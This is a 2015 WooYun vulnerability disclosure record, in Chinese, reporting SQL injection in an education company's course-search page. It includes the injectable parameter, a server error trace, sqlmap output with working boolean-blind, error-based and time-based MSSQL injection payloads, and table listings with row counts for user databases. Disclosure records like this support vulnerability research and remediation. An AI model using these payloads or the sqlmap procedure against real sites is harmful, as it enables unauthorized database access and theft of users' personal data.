{"id": 84406, "wybug_id": "wooyun-2015-0144916", "wybug_title": "海天教育官网存在漏洞几十万条用户信息泄露", "wybug_corp": "海天教育", "wybug_author": "路人甲", "wybug_date": "2015-10-09 22:34", "wybug_open_date": "2015-11-28 08:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向公众公开  简要描述： 攒了很久的漏洞，一起发出来吧 详细说明：  注入点：**.**.**.**/SelectResult.aspx?Subject=%E6%94%BF%E6%B2%BB%E7%9C%9F%E9%A2%98【手工测试】：Subject参数后加单引号直接报错\n说明: 执行当前 Web 请求期间，出现未处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。异常详细信息: System.Data.SqlClient.SqlException: 字符串 ')    ' 后的引号不完整。')    ' 附近有语法错误。源错误:行 69: 行 70:         dp.WHERE_txt = sbWhere.ToString();行 71:         dp.TotalNumDataBind();行 72: 行 73:         //以确保页码数字不会越界源文件: d:\\web\\newstation\\海天考研新站\\SelectResult.aspx.cs    行: 71\n【sqlmap截图】：\n\nroot权限：\n\n泄露的是几十万条，怎么算的呢？首先主站62087条而从12到16年有每年的数据库统计，每年大约7万条6 * 7 + 6 大约是50万【条】用户信息数据库信息：\nDatabase: UNCC_Haitian2014+--------------------------------------------------+---------+| Table                                            | Entries |+--------------------------------------------------+---------+| dbo.StudentCourse                                | 347944  || dbo.StudentCardCourse                            | 344235  || dbo.Member                                       | 84396   || dbo.Student                                      | 12033   || dbo.StudentCategory                              | 12033   |\n\nDatabase: UNCC_Haitian2012+--------------------------------------------------+---------| Table                                            | Entries+--------------------------------------------------+---------| dbo.StudentCourse                                | 345004| dbo.StudentCardCourse                            | 328055| dbo.Member                                       | 68606| dbo.Student                                      | 56765| dbo.StudentCategory                              | 56765| dbo.Region                                       | 3468\n\nDatabase: UNCC_Haitian2016+--------------------------------------------------+---------| Table                                            | Entries+--------------------------------------------------+---------| dbo.StudentCourse                                | 410617| dbo.StudentCardCourse                            | 406846| dbo.Member                                       | 92472| dbo.Region                                       | 3468| dbo.Course                                       | 2462\n\nDatabase: HTKaoyanDB+--------------------------------------------------+---------+| Table                                            | Entries |+--------------------------------------------------+---------+| dbo.ZiLiao                                       | 358416  || dbo.SMSLog                                       | 114543  || dbo.WebPage                                      | 79333   || dbo.UserGrowUp                                   | 62087   || dbo.UserAccount                                  | 43771   |\n   漏洞证明：  【sqlmap全过程】：\n[17:55:11] [INFO] testing connection to the target URL[17:55:13] [INFO] testing if the target URL is stable. This can take a couple of seconds[17:55:15] [INFO] target URL is stable[17:55:15] [INFO] testing if GET parameter 'Subject' is dynamic[17:55:17] [INFO] confirming that GET parameter 'Subject' is dynamic[17:55:18] [INFO] GET parameter 'Subject' is dynamic[17:55:19] [WARNING] heuristic (basic) test shows that GET parameter 'Subject' might not be injectable[17:55:19] [INFO] testing for SQL injection on GET parameter 'Subject'[17:55:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:55:30] [WARNING] reflective value(s) found and filtering out[17:55:31] [INFO] GET parameter 'Subject' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[17:55:32] [WARNING] if you experience problems with non-ASCII identifier namesyou are advised to rerun with '--tamper=charunicodeencode'[17:55:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Microsoft SQL Server'do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1) values? [Y/n][17:55:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:55:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:55:42] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:55:42] [INFO] GET parameter 'Subject' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause' injectable[17:55:42] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:55:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:55:42] [WARNING] time-based comparison requires larger statistical model, please wait....[17:55:47] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:55:47] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'[17:56:04] [INFO] GET parameter 'Subject' seems to be 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' injectable[17:56:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[17:56:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique foundGET parameter 'Subject' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 51 HTTP(s) requests:---Parameter: Subject (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Subject=政治真题%' AND 7845=7845 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Subject=政治真题%' AND 2043=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2043=2043) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(107)+CHAR(113))) AND '%'='    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: Subject=政治真题%' AND 2476=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers ASsys6,sysusers AS sys7) AND '%'='---[17:56:08] [INFO] testing Microsoft SQL Server[17:56:08] [INFO] confirming Microsoft SQL Server[17:56:08] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-10-14 08:45 厂商回复： 暂未建立与网站管理单位的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}